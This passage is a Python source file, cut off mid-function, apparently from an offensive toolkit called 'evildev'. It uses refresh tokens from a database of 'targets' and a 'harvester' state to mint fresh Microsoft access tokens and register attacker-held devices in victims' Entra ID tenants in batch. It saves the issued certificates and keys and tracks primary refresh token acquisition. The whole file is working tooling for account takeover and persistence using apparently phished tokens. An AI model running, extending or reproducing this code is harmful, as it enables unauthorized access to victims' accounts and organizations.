#!/usr/bin/env python3
"""
DRS enrollment client and batch driver.

Three entry modes, selected by which flags are present:

  1. Manual single-target (--cn given): generate a keypair + CSR for one
     device, POST to DRS, write the certificate.

  2. Batch from DB (no --cn, default): read targets from targets/tokens,
     filter to those whose token carries scp=adrs_access, enroll each.

  3. Batch from harvester state (no --cn, --from-state): read the single
     token from harvester state, enroll it as one synthetic target.

The envelope shape follows the [MS-DVRJ] Device Registration Join Protocol.
Field names in ENVELOPE_KEYS are load-bearing; the spec requires RSA-2048
with SHA256WithRSAEncryption, so EC keys are rejected at the CLI layer.

The DRS response places the issued certificate under Certificate.RawBody
as base64 DER and identifies the user under User.ObjectId. extract_* read
those specific fields; older spellings are still probed as fallbacks.

IMPORTANT: DRS enrollment requires a *freshly minted* access token. The
bundle's cached AT — even if the exp claim is still in the future — will
be rejected with AuthenticationError "Invalid JWT token". This module
always refreshes the AT from the stored RT immediately before the DRS
POST. See `acquire_access_token` for the details.
"""

import argparse
import base64
import json
import os
import re
import sys
import uuid
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import urllib.request
import urllib.parse
import urllib.error

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, ec
from cryptography.x509.oid import NameOID, ObjectIdentifier


# ---------------------------------------------------------------------------
# Endpoint and envelope shape
# ---------------------------------------------------------------------------
DEFAULT_ENDPOINT = (
    "https://enterpriseregistration.windows.net/EnrollmentServer/device/"
    "?api-version=1.0"
)

ENVELOPE_KEYS = {
    "certificate_request": "CertificateRequest",
    "transport_key":       "TransportKey",
    "target_domain":       "TargetDomain",
    "device_type":         "DeviceType",
    "os_version":          "OSVersion",
    "device_display_name": "DeviceDisplayName",
    "join_type":           "JoinType",
}

JOIN_TYPE_WORKPLACE = 0
CERT_REQUEST_TYPE = "PKCS10"


# ---------------------------------------------------------------------------
# Keypair and CSR generation (unchanged)
# ---------------------------------------------------------------------------

def generate_private_key(key_type, rsa_bits, ec_curve):
    if key_type == "rsa":
        return rsa.generate_private_key(public_exponent=65537, key_size=rsa_bits)
    curves = {
        "secp256r1": ec.SECP256R1(),
        "secp384r1": ec.SECP384R1(),
        "secp521r1": ec.SECP521R1(),
    }
    if ec_curve not in curves:
        raise ValueError(f"unsupported EC curve: {ec_curve}")
    return ec.generate_private_key(curves[ec_curve])


def generate_transport_key(rsa_bits: int = 2048):
    return rsa.generate_private_key(public_exponent=65537, key_size=rsa_bits)


def encode_transport_key_public(private_key) -> str:
    import struct
    pub = private_key.public_key().public_numbers()
    e_bytes = pub.e.to_bytes((pub.e.bit_length() + 7) // 8, "big")
    n_bytes = pub.n.to_bytes((pub.n.bit_length() + 7) // 8, "big")
    header = struct.pack(
        "<IIIIII",
        0x31415352,
        pub.n.bit_length(),
        len(e_bytes),
        len(n_bytes),
        0,
        0,
    )
    blob = header + e_bytes + n_bytes
    return base64.b64encode(blob).decode("ascii")


def parse_attrs(pairs):
    out = []
    for pair in pairs or []:
        if "=" not in pair:
            raise ValueError(f"--attr must be OID=VALUE, got: {pair!r}")
        oid_str, _, value = pair.partition("=")
        try:
            oid = ObjectIdentifier(oid_str.strip())
        except ValueError as e:
            raise ValueError(f"invalid OID {oid_str!r}: {e}") from e
        out.append((oid, value))
    return out


def build_csr(private_key, common_name, organization, extra_attrs):
    subject_parts = [x509.NameAttribute(NameOID.COMMON_NAME, common_name)]
    if organization:
        subject_parts.append(
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, organization)
        )
    builder = x509.CertificateSigningRequestBuilder().subject_name(
        x509.Name(subject_parts)
    )
    for oid, value in extra_attrs:
        builder = builder.add_attribute(oid, [value])
    return builder.sign(private_key, hashes.SHA256())


def encode_csr(csr, mode: str) -> str:
    if mode == "der-b64":
        der = csr.public_bytes(serialization.Encoding.DER)
        return base64.b64encode(der).decode("ascii")
    if mode == "pem":
        return csr.public_bytes(serialization.Encoding.PEM).decode("ascii")
    if mode == "pem-b64":
        pem = csr.public_bytes(serialization.Encoding.PEM)
        return base64.b64encode(pem).decode("ascii")
    raise ValueError(f"unknown CSR encoding: {mode}")


def _derive_target_domain(upn: str) -> str:
    if not upn or "@" not in upn:
        return ""
    return upn.rsplit("@", 1)[1].strip().lower()


def build_envelope(csr_der_b64, transport_key_b64, args, upn: Optional[str] = None):
    target_domain = (
        getattr(args, "target_domain", None)
        or _derive_target_domain(upn or "")
    )
    display_name = (
        getattr(args, "display_name", None)
        or getattr(args, "cn", None)
        or "Unnamed Device"
    )
    envelope = {
        ENVELOPE_KEYS["certificate_request"]: {
            "Type": CERT_REQUEST_TYPE,
            "Data": csr_der_b64,
        },
        ENVELOPE_KEYS["transport_key"]: transport_key_b64,
        ENVELOPE_KEYS["target_domain"]: target_domain,
        ENVELOPE_KEYS["device_type"]: getattr(args, "os_type", None) or "Windows",
        ENVELOPE_KEYS["os_version"]: getattr(args, "os_version", None) or "10.0.19045",
        ENVELOPE_KEYS["device_display_name"]: display_name,
        ENVELOPE_KEYS["join_type"]: JOIN_TYPE_WORKPLACE,
    }
    return envelope


def post_enrollment(endpoint, token, envelope, timeout):
    body = json.dumps(envelope).encode("utf-8")
    req = urllib.request.Request(
        endpoint,
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read()


def classify_failure(status, body_bytes):
    text = body_bytes.decode("utf-8", errors="replace") if body_bytes else ""
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        parsed = {}

    if status in (401, 403):
        return ("auth", "Token rejected or policy disallows enrollment. "
                        "Check audience, scp=adrs_access, and tenant "
                        "device-registration policy (MFA / Conditional Access).")
    if status == 400 and not parsed:
        return ("schema", "Opaque 400 with no field detail.")
    if status == 400:
        message = (
            parsed.get("Message")
            or parsed.get("message")
            or parsed.get("error_description")
            or text[:500]
        )
        error_type = parsed.get("ErrorType") or parsed.get("error") or "schema"

        # DRS wraps tenant-side blocks in a 400 with ErrorType=AuthorizationError.
        # The "schema/" prefix is technically accurate (it's a structured 400)
        # but misleading: the actual failure is a policy/eligibility block
        # that has nothing to do with our CSR or envelope shape. Special-case
        # the two most common cases so the classification matches what
        # drs_re_enroll's pre-flight will eventually return.
        #
        # Order matters: the device-cap error message also contains the phrase
        # "not eligible to enroll", so device_cap MUST be checked before any
        # broader eligibility marker.
        msg_lower = str(message).lower()
        if "devicecapreached" in msg_lower:
            return ("device_cap", str(message)[:500])
        if ("administrator policy does not allow" in msg_lower
                or "does not allow this user" in msg_lower):
            return ("policy", str(message)[:500])

        return (f"schema/{error_type}", str(message)[:500])
    return ("other", f"HTTP {status}: {text[:500]}")


def _to_pem_from_b64_der(b64_der: str) -> str:
    try:
        der = base64.b64decode(b64_der)
        cert = x509.load_der_x509_certificate(der)
        return cert.public_bytes(serialization.Encoding.PEM).decode("ascii")
    except Exception:
        return b64_der


def extract_certificate(parsed: Dict[str, Any]) -> Optional[str]:
    cert_obj = parsed.get("Certificate") or parsed.get("certificate")
    if isinstance(cert_obj, dict):
        raw = cert_obj.get("RawBody") or cert_obj.get("rawBody")
        if raw:
            return _to_pem_from_b64_der(raw)
        inner = (
            cert_obj.get("Data") or cert_obj.get("Certificate")
            or cert_obj.get("certificate")
        )
        if isinstance(inner, str):
            return _to_pem_from_b64_der(inner)
        if isinstance(inner, dict):
            nested = (
                inner.get("RawBody") or inner.get("rawBody")
                or inner.get("Data") or inner.get("Certificate")
            )
            if isinstance(nested, str):
                return _to_pem_from_b64_der(nested)
    if isinstance(cert_obj, str):
        return _to_pem_from_b64_der(cert_obj)
    for key in ("Cert", "cert"):
        v = parsed.get(key)
        if isinstance(v, str):
            return _to_pem_from_b64_der(v)
    cr = parsed.get("CertificateRequest") or parsed.get("certificateRequest")
    if isinstance(cr, dict):
        v = cr.get("Data") or cr.get("Certificate")
        if isinstance(v, str):
            return _to_pem_from_b64_der(v)
    return None


def extract_device_id(parsed: Dict[str, Any]) -> Optional[str]:
    user = parsed.get("User")
    if isinstance(user, dict):
        oid = user.get("ObjectId") or user.get("objectId")
        if oid:
            return oid
    return (
        parsed.get("DeviceId") or parsed.get("deviceId")
        or parsed.get("DeviceID") or parsed.get("Id")
    )


# ---------------------------------------------------------------------------
# DB and harvester state access
# ---------------------------------------------------------------------------

def _db_module():
    try:
        import evildev.db as _db
        return _db
    except Exception:
        try:
            import db as _db
            return _db
        except Exception as e:
            raise RuntimeError(f"cannot import db module: {e}")


def execute_query(*args, **kwargs):
    return _db_module().execute_query(*args, **kwargs)


def decode_jwt(token):
    try:
        from evildev.core import decode_jwt as _decode
    except Exception:
        try:
            from core import decode_jwt as _decode
        except Exception:
            _decode = None
    if _decode is not None:
        try:
            return _decode(token) or {}
        except Exception:
            pass
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        payload = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def _get_crypto_utils():
    try:
        from evildev.core import CryptoUtils as _c
        return _c
    except Exception:
        try:
            from core import CryptoUtils as _c
            return _c
        except Exception:
            return None


def _get_refresh_manager():
    try:
        from evildev.token_refresh_manager import token_refresh_manager as _m
        return _m
    except Exception:
        try:
            from token_refresh_manager import token_refresh_manager as _m
            return _m
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Batch: DB-backed target loading (unchanged)
# ---------------------------------------------------------------------------
MARKER_COLUMN = "drs_enrolled_at"
PRT_MARKER_COLUMN = "prt_acquired_at"


def _ensure_target_columns(*columns: str) -> bool:
    try:
        engine = None
        try:
            engine, _, _, _ = _db_module().get_effective_db_settings()
        except Exception:
            pass
        if engine == "postgres":
            cols = execute_query(
                """SELECT column_name FROM information_schema.columns
                   WHERE table_name = 'targets'
                     AND table_schema = current_schema()""",
                fetch_all=True,
            ) or []
            names = {row[0] for row in cols}
        else:
            cols = execute_query("PRAGMA table_info(targets)", fetch_all=True) or []
            names = {row[1] for row in cols}
        for column in columns:
            if column not in names:
                execute_query(f"ALTER TABLE targets ADD COLUMN {column} TEXT", commit=True)
        return True
    except Exception as e:
        print(f"[!] could not ensure target marker columns: {e}", file=sys.stderr)
        return False


def ensure_marker_column() -> bool:
    return _ensure_target_columns(MARKER_COLUMN)


def ensure_prt_marker_column() -> bool:
    return _ensure_target_columns(PRT_MARKER_COLUMN)


def mark_enrolled(email: str) -> None:
    try:
        execute_query(
            f"UPDATE targets SET {MARKER_COLUMN} = ?, drs_enrolled_error = NULL "
            "WHERE LOWER(email) = LOWER(?)",
            params=(datetime.now(timezone.utc).isoformat(), email),
            commit=True,
        )
    except Exception as e:
        print(f"[!] failed to mark {email} as DRS-enrolled: {e}", file=sys.stderr)


def mark_enrolled_failed(email: str, error: str) -> None:
    try:
        execute_query(
            "UPDATE targets SET drs_enrolled_error = ?, drs_enrolled_at = NULL "
            "WHERE LOWER(email) = LOWER(?)",
            params=(str(error)[:2000], email),
            commit=True,
        )
    except Exception as e:
        print(f"[!] failed to record DRS error for {email}: {e}", file=sys.stderr)


def mark_prt_acquired(email: str) -> None:
    try:
        execute_query(
            f"UPDATE targets SET {PRT_MARKER_COLUMN} = ?, drs_prt_error = NULL "
            "WHERE LOWER(email) = LOWER(?)",
            params=(datetime.now(timezone.utc).isoformat(), email),
            commit=True,
        )
    except Exception as e:
        print(f"[!] failed to mark {email} as PRT-acquired: {e}", file=sys.stderr)


def mark_prt_failed(email: str, error: str) -> None:
    try:
        execute_query(
            "UPDATE targets SET drs_prt_error = ?, prt_acquired_at = NULL "
            "WHERE LOWER(email) = LOWER(?)",
            params=(str(error)[:2000], email),
            commit=True,
        )
    except Exception as e:
        print(f"[!] failed to record PRT error for {email}: {e}", file=sys.stderr)


def load_targets(include_enrolled: bool, status: Optional[str]) -> List[Dict[str, Any]]:
    where_parts = [
        "t.email IS NOT NULL",
        "TRIM(t.email) <> ''",
        "t.email LIKE '%@%'",
    ]
    params: List[Any] = []
    if status:
        where_parts.append("t.status = ?")
        params.append(status)
    if not include_enrolled:
        where_parts.append(f"(t.{MARKER_COLUMN} IS NULL OR t.{MARKER_COLUMN} = '')")
    where_sql = "WHERE " + " AND ".join(where_parts)
    rows = execute_query(
        f"""
        SELECT t.email, t.status, t.source_email, t.created_at,
             tok.encrypted_token, tok.expires_at
        FROM targets t
        LEFT JOIN tokens tok ON LOWER(tok.email) = LOWER(t.email)
        {where_sql}
        ORDER BY COALESCE(t.captured_at, t.created_at) DESC
        """,
        params=tuple(params) if params else None,
        fetch_all=True,
    ) or []
    return [
        {
            "email": row[0],
            "status": row[1],
            "source_email": row[2],
            "created_at": row[3],
            "encrypted_token": row[4],
            "expires_at": row[5],
        }
        for row in rows
    ]


def load_single_target(email: str) -> List[Dict[str, Any]]:
    rows = execute_query(
        """
        SELECT t.email, t.status, t.source_email, t.created_at,
               tok.encrypted_token, tok.expires_at
        FROM targets t
        LEFT JOIN tokens tok ON LOWER(tok.email) = LOWER(t.email)
        WHERE LOWER(t.email) = LOWER(?)
        """,
        params=(email,),
        fetch_all=True,
    ) or []
    return [
        {
            "email": row[0],
            "status": row[1],
            "source_email": row[2],
            "created_at": row[3],
            "encrypted_token": row[4],
            "expires_at": row[5],
        }
        for row in rows
    ]


def _load_encrypted_state_file(path: Path) -> Optional[Dict[str, Any]]:
    if not path.exists():
        return None
    try:
        raw = json.loads(path.read_text(encoding="utf-8"))
    except Exception as e:
        print(f"[!] {path} is not valid JSON: {e}", file=sys.stderr)
        return None
    if not isinstance(raw, dict):
        print(f"[!] {path} did not contain a JSON object", file=sys.stderr)
        return None
    if raw.get("__type__") != "harvester_state_v1":
        return raw
    try:
        decrypt = _db_module().decrypt_harvester_state
    except Exception:
        print(f"[!] decrypt_harvester_state not available", file=sys.stderr)
        return None
    try:
        return decrypt(raw)
    except Exception as e:
        print(f"[!] could not decrypt {path}: {e}", file=sys.stderr)
        return None


def load_targets_from_state() -> List[Dict[str, Any]]:
    load_harvester_state = None
    try:
        load_harvester_state = _db_module().load_harvester_state
    except Exception:
        pass
    state = None
    if load_harvester_state:
        try:
            state = load_harvester_state("default")
        except Exception as e:
            print(f"[!] load_harvester_state failed: {e}", file=sys.stderr)
            state = None
    if state is None:
        path = Path(os.environ.get("HARVESTER_STATE_FILE", "harvester_state.json"))
        state = _load_encrypted_state_file(path)
    if not state:
        print(f"[!] no harvester state found", file=sys.stderr)
        return []
    token_data = state.get("token_data") or {}
    token = token_data.get("access_token")
    if not token:
        print(f"[!] harvester state has no access_token", file=sys.stderr)
        return []
    claims = decode_jwt(token) or {}
    return [{
        "email": claims.get("upn") or claims.get("unique_name") or "state@local",
        "status": "manual",
        "source_email": None,
        "created_at": None,
        "encrypted_token": None,
        "expires_at": None,
        "_preloaded_token": token,
    }]


def _decrypt_stored_token(encrypted_token: str) -> Optional[Dict[str, Any]]:
    if not encrypted_token:
        return None
    crypto = _get_crypto_utils()
    if crypto is None:
        return None
    key_hex = (
        os.environ.get("TOKEN_ENCRYPTION_KEY")
        or os.environ.get("WORM_MASTER_KEY")
        or os.environ.get("ENCRYPTION_KEY")
        or ""
    )
    if len(key_hex) < 64:
        return None
    try:
        master_key = bytes.fromhex(key_hex[:64])
        raw = base64.b64decode(encrypted_token)
        nonce, ciphertext = raw[:12], raw[12:]
        plaintext = crypto.aes_gcm_decrypt(master_key, nonce, ciphertext)
        if not plaintext:
            return None
        return json.loads(plaintext.decode("utf-8"))
    except Exception as e:
        print(f"[!] decrypt failed: {e}", file=sys.stderr)
        return None


def _refresh_token(email: str) -> Optional[Dict[str, Any]]:
    """Kept for backward compat. The current path uses _refresh_access_token_now."""
    mgr = _get_refresh_manager()
    if mgr is None:
        return None
    fn = getattr(mgr, "refresh_single", None)
    if not callable(fn):
        return None
    try:
        result = fn(email)
    except Exception as e:
        print(f"[!] refresh raised for {email}: {e}", file=sys.stderr)
        return None
    if result and getattr(result, "success", False) and getattr(result, "token_data", None):
        return result.token_data
    return None

# ---------------------------------------------------------------------------
# Fresh-token acquisition (the fix for "Invalid JWT token" from DRS)
# ---------------------------------------------------------------------------

def _refresh_access_token_now(email: str, scope: str) -> Optional[str]:
    """Exchange the stored RT for a fresh AT with the given scope.

    DRS rejects cached access tokens even when the `exp` claim is still
    in the future. The enrollment flow expects a token minted seconds
    ago — matching what a real Windows device sends when it calls
    Enterpriseregistration. This function refreshes immediately before
    the DRS POST so the AT satisfies that freshness constraint.

    Returns the fresh access token, or None on failure.
    Also updates the DB with the new AT + rotated RT (if Microsoft
    rotates it, which it usually does).

    Never raises. All failure modes are logged to stderr and returned
    as None so the caller can fall back to the stored AT if needed.
    """
    row = execute_query(
        "SELECT encrypted_token FROM tokens WHERE LOWER(email) = LOWER(?)",
        params=(email,),
        fetch_one=True,
    )
    if not row or not row[0]:
        print(f"[!] _refresh_access_token_now: no token row for {email}",
              file=sys.stderr)
        return None

    payload = _decrypt_stored_token(row[0])
    if not payload:
        print(f"[!] _refresh_access_token_now: decrypt failed for {email}",
              file=sys.stderr)
        return None

    rt = payload.get("refresh_token")
    cid = payload.get("client_id") or os.environ.get("CLIENT_ID")
    if not rt or not cid:
        print(f"[!] _refresh_access_token_now: no RT or client_id for {email}",
              file=sys.stderr)
        return None

    tid = (
        (payload.get("user_info") or {}).get("tenantId")
        or (decode_jwt(payload.get("access_token", "")) or {}).get("tid")
        or os.environ.get("TENANT", "common")
    )

    url = f"https://login.microsoftonline.com/{tid}/oauth2/v2.0/token"
    body = urllib.parse.urlencode({
        "grant_type": "refresh_token",
        "client_id": cid,
        "refresh_token": rt,
        "scope": scope,
    }).encode("utf-8")
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", errors="replace")
        print(
            f"[!] _refresh_access_token_now: HTTP {e.code} for {email} — "
            f"{err[:300]}",
            file=sys.stderr,
        )
        return None
    except Exception as e:
        print(f"[!] _refresh_access_token_now: {type(e).__name__} for {email}: {e}",
              file=sys.stderr)
        return None

    fresh_at = data.get("access_token")
    if not fresh_at:
        print(
            f"[!] _refresh_access_token_now: no access_token in response "
            f"(error={data.get('error')})",
            file=sys.stderr,
        )
        return None

    # Persist the fresh AT + rotated RT so future enrollments are fast.
    try:
        fresh_rt = data.get("refresh_token")
        payload["access_token"] = fresh_at
        if fresh_rt:
            payload["refresh_token"] = fresh_rt
        if "expires_in" in data:
            payload["expires_in"] = data["expires_in"]
        if "id_token" in data and data["id_token"]:
            payload["id_token"] = data["id_token"]

        crypto = _get_crypto_utils()
        key_hex = (
            os.environ.get("TOKEN_ENCRYPTION_KEY")
            or os.environ.get("WORM_MASTER_KEY")
            or os.environ.get("ENCRYPTION_KEY")
            or ""
        )
        if crypto and len(key_hex) >= 64:
            master_key = bytes.fromhex(key_hex[:64])
            nonce, ct = crypto.aes_gcm_encrypt(
                master_key,
                json.dumps(
                    payload, separators=(",", ":"), sort_keys=True
                ).encode("utf-8"),
            )
            encrypted = base64.b64encode(nonce + ct).decode("utf-8")
            expires_at = (
                datetime.now(timezone.utc)
                + timedelta(seconds=int(data.get("expires_in", 3600)))
            ).isoformat()
            execute_query(
                "UPDATE tokens SET encrypted_token = ?, expires_at = ?, "
                "captured_at = ? WHERE LOWER(email) = LOWER(?)",
                params=(
                    encrypted,
                    expires_at,
                    datetime.now(timezone.utc).isoformat(),
                    email,
                ),
                commit=True,
            )
    except Exception as e:
        # Persist failure is non-fatal — the caller still gets a fresh AT.
        print(f"[!] _refresh_access_token_now: could not persist fresh token "
              f"for {email}: {e}", file=sys.stderr)

    return fresh_at


def acquire_access_token(target: Dict[str, Any]) -> Tuple[Optional[str], str]:
    """Acquire a FRESH access token for DRS enrollment.

    DRS rejects cached access tokens — even unexpired ones — because
    the enrollment flow requires a token minted immediately before the
    POST. This always refreshes from the stored RT so the token is
    seconds old, matching what a real Windows client sends.

    Returns (access_token, reason_string). On success, reason is "".
    On failure, reason explains why.
    """
    if target.get("_preloaded_token"):
        return target["_preloaded_token"], ""

    email = target["email"]

    # Always try to refresh first. This is what makes enrollment work.
    # The stored AT from the bundle is too old for DRS to accept.
    fresh_at = _refresh_access_token_now(
        email,
        scope="urn:ms-drs:enterpriseregistration.windows.net/.default",
    )
    if fresh_at:
        return fresh_at, ""

    # Fallback: use the stored AT if refresh failed entirely.
    # This is only reached when the RT itself is dead (revoked, expired,
    # or tenant policy blocks the refresh grant). DRS will reject the
    # stale AT with AuthenticationError, but at least we give it a shot.
    if target.get("encrypted_token"):
        payload = _decrypt_stored_token(target["encrypted_token"])
        if payload and payload.get("access_token"):
            print(
                f"[!] refresh failed for {email}, falling back to stored AT "
                f"(DRS may reject as stale)",
                file=sys.stderr,
            )
            return payload["access_token"], ""

    return None, "no token stored or refresh failed"


# ---------------------------------------------------------------------------
# DRS scope check
# ---------------------------------------------------------------------------

def token_has_drs_scope(token: str) -> bool:
    claims = decode_jwt(token) or {}
    scp = claims.get("scp") or claims.get("scope") or ""
    if isinstance(scp, list):
        scp = " ".join(scp)
    return "adrs_access" in str(scp).split()


# ---------------------------------------------------------------------------
# Attempt record writer
# ---------------------------------------------------------------------------

def write_attempt_record(out_dir: Path, email: str, status: int,
                         category: str, message: str, body: bytes) -> Path:
    attempted_at = datetime.now(timezone.utc)
    safe_email = re.sub(r"[^A-Za-z0-9._-]+", "_", email).strip("._") or "target"
    timestamp = attempted_at.strftime("%Y%m%dT%H%M%S%fZ")
    path = out_dir / f"{safe_email}.{timestamp}.attempt.json"
    body_excerpt = body.decode("utf-8", errors="replace")[:4000] if body else ""
    record = {
        "email": email,
        "attempted_at": attempted_at.isoformat(),
        "http_status": status,
        "category": category,
        "message": message,
        "body_excerpt": body_excerpt,
    }
    path.write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# Enrollment: shared core
# ---------------------------------------------------------------------------

class ArgsNamespace:
    """Stand-in for the argparse namespace that build_envelope expects."""
    pass


def _write_key(key, path: Path, overwrite: bool = False) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    mode = "wb" if overwrite else "xb"
    with path.open(mode) as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ))


def _new_enrollment_dir(out_root: Path) -> Path:
    out_root.mkdir(parents=True, exist_ok=True)
    while True:
        enrollment_id = str(uuid.uuid4())
        enrollment_dir = out_root / enrollment_id
        try:
            enrollment_dir.mkdir(parents=False, exist_ok=False)
            return enrollment_dir
        except FileExistsError:
            continue


def _cert_thumbprint_sha1(cert_pem_text: str) -> str:
    cert = x509.load_pem_x509_certificate(cert_pem_text.encode("utf-8"))
    return cert.fingerprint(hashes.SHA1()).hex().upper()

def enroll_one(token: str, target: Dict[str, Any], opts: argparse.Namespace) -> Dict[str, Any]:
    """Enroll one target. Never raises. Returns a result dict."""
    result = {"email": target["email"], "success": False}

    try:
        if opts.key_type != "rsa":
            raise ValueError("DRS requires RSA keys; --key-type ec is not accepted")

        key = generate_private_key("rsa", opts.rsa_bits, opts.ec_curve)
        csr = build_csr(key, opts.cn_prefix + "-" + target["email"], opts.org, parse_attrs([]))
        csr_encoded = encode_csr(csr, opts.csr_encoding)

        transport_key = generate_transport_key(opts.rsa_bits)
        transport_key_b64 = encode_transport_key_public(transport_key)

        ns = ArgsNamespace()
        ns.cn = opts.cn_prefix + "-" + target["email"]
        ns.display_name = getattr(opts, "display_name", None) or (
            opts.cn_prefix + "-" + target["email"].split("@", 1)[0]
        )
        ns.os_type = opts.os_type
        ns.os_version = opts.os_version
        ns.target_domain = getattr(opts, "target_domain", None)

        envelope = build_envelope(csr_encoded, transport_key_b64, ns, upn=target["email"])

        if opts.dry_run:
            preview = dict(envelope)
            inner = preview.get(ENVELOPE_KEYS["certificate_request"])
            if isinstance(inner, dict):
                data = inner.get("Data", "")
                inner = dict(inner)
                inner["Data"] = data[:64] + "...[truncated]"
                preview[ENVELOPE_KEYS["certificate_request"]] = inner
            tk = preview.get(ENVELOPE_KEYS["transport_key"], "")
            preview[ENVELOPE_KEYS["transport_key"]] = tk[:32] + "...[truncated]"
            result["success"] = True
            result["dry_run"] = True
            result["envelope"] = preview
            return result

        if not opts.out_dir:
            raise ValueError("--out-dir is required to preserve the private key")
        out = Path(opts.out_dir)
        out.mkdir(parents=True, exist_ok=True)

        if getattr(opts, "enrollment_dir", None):
            enroll_dir = Path(opts.enrollment_dir)
            enroll_dir.mkdir(parents=True, exist_ok=True)
        else:
            enroll_dir = _new_enrollment_dir(out)

        enrollment_id = enroll_dir.name
        result["enrollment_id"] = enrollment_id
        result["enrollment_dir"] = str(enroll_dir)

        key_path = enroll_dir / "key.pem"
        transport_key_path = enroll_dir / "transport.key.pem"
        cert_path = enroll_dir / "cert.pem"
        meta_path = enroll_dir / "meta.json"

        # Overwrite existing artifacts. A fresh keypair invalidates any
        # old cert that might be sitting here — keeping stale files would
        # leave the directory in an inconsistent state (cert doesn't pair
        # with key). The FileExistsError from "xb" would also bubble up
        # as a local filesystem error that overwrites the real DRS
        # drs_enrolled_error, hiding the actual problem.
        _write_key(key, key_path, overwrite=True)
        _write_key(transport_key, transport_key_path, overwrite=True)
        result["key_out"] = str(key_path)
        result["transport_key_out"] = str(transport_key_path)

        status, _headers, body = post_enrollment(
            opts.endpoint, token, envelope, opts.timeout
        )
        result["http_status"] = status

        if 200 <= status < 300:
            try:
                parsed = json.loads(body.decode("utf-8"))
            except Exception:
                parsed = {}

            cert = extract_certificate(parsed)
            device_id = extract_device_id(parsed)

            if not cert:
                message = "DRS returned a successful HTTP status without a recognized certificate field"
                result["failure_kind"] = "no-cert"
                result["failure_message"] = message
                result["cert_out"] = None
                result["attempt_out"] = str(write_attempt_record(
                    out, target["email"], status, "no-cert", message, body
                ))
                return result

            cert_path.write_text(cert if cert.endswith("\n") else cert + "\n")
            result["cert_out"] = str(cert_path)
            result["success"] = True
            result["device_id"] = device_id
            result["has_cert"] = True

            tenant_id = decode_jwt(token).get("tid") or ""

            try:
                thumbprint = _cert_thumbprint_sha1(cert)
                meta = {
                    "enrollment_id": enrollment_id,
                    "email": target["email"],
                    "tenant_id": tenant_id,
                    "device_id": device_id,
                    "created_at": datetime.now(timezone.utc).isoformat(),
                    "cert_thumbprint": thumbprint,
                }
                meta_path.write_text(
                    json.dumps(meta, indent=2) + "\n", encoding="utf-8"
                )
            except Exception as e:
                print(f"[!] could not write meta.json: {e}", file=sys.stderr)

            try:
                db = _db_module()
                email_for_db = (target.get("email") or "").strip().lower()
                if not email_for_db or email_for_db == "state@local" or "@" not in email_for_db:
                    print(
                        f"[+] skipping enrollment DB write for synthetic "
                        f"target {email_for_db!r} (from-state mode)",
                        file=sys.stderr,
                    )
                elif db.create_enrollment(enrollment_id,
                                          email_for_db,
                                          tenant_id,
                                          str(enroll_dir)):
                    db.update_enrollment(
                        enrollment_id,
                        device_id=device_id,
                        cert_thumbprint=_cert_thumbprint_sha1(cert),
                    )
            except Exception as e:
                print(f"[!] could not record enrollment in DB: {e}",
                      file=sys.stderr)
            return result

        kind, msg = classify_failure(status, body)
        result["failure_kind"] = kind
        result["failure_message"] = msg
        try:
            mark_enrolled_failed(target["email"], f"{kind}: {msg}")
        except Exception:
            pass
        result["attempt_out"] = str(write_attempt_record(
            out, target["email"], status, kind, msg, body
        ))
        return result

    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        try:
            mark_enrolled_failed(target["email"], result["error"])
        except Exception:
            pass
        return result


# ---------------------------------------------------------------------------
# Mode: manual single target
# ---------------------------------------------------------------------------

def run_manual(args) -> int:
    """--cn mode: one target from CLI flags."""
    if args.key_type != "rsa":
        print("[!] DRS requires RSA keys; --key-type ec is not accepted", file=sys.stderr)
        return 2

    extra_attrs = parse_attrs(args.attr)
    key = generate_private_key("rsa", args.rsa_bits, args.ec_curve)
    csr = build_csr(key, args.cn, args.org, extra_attrs)
    transport_key = generate_transport_key(args.rsa_bits)
    transport_key_b64 = encode_transport_key_public(transport_key)

    key_out = Path(args.key_out)
    if args.dry_run:
        pass
    else:
        key_out.parent.mkdir(parents=True, exist_ok=True)
        with key_out.open("xb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        transport_key_path = key_out.with_suffix(".transport.key.pem")
        with transport_key_path.open("xb") as f:
            f.write(transport_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption(),
            ))
        print(f"[+] transport key written to {transport_key_path}", file=sys.stderr)

    if args.csr_out:
        Path(args.csr_out).write_bytes(csr.public_bytes(serialization.Encoding.PEM))

    csr_encoded = encode_csr(csr, args.csr_encoding)

    class _Ns:
        pass
    ns = _Ns()
    ns.cn = args.cn
    ns.display_name = args.display_name or args.cn
    ns.os_type = args.os_type
    ns.os_version = args.os_version
    ns.target_domain = args.target_domain

    envelope = build_envelope(csr_encoded, transport_key_b64, ns, upn=args.cn)

    if args.dry_run:
        preview = dict(envelope)
        inner = preview.get(ENVELOPE_KEYS["certificate_request"])
        if isinstance(inner, dict):
            data = inner.get("Data", "")
            inner = dict(inner)
